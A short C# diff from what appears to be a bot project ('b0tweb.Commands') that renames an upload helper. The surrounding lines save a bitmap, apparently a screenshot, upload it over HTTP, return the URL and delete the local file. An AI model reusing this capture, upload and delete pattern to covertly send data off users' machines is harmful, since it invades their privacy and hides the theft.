@@ -35,7 +35,7 @@ namespace b0tweb.Commands
                 bmp.Save(path);
             }
 
-            string url = HTTPUpload.Upload(path);
+            string url = HTTPHelper.Upload(path);
             FileHelper.DeleteFile(path);
 
             return url;
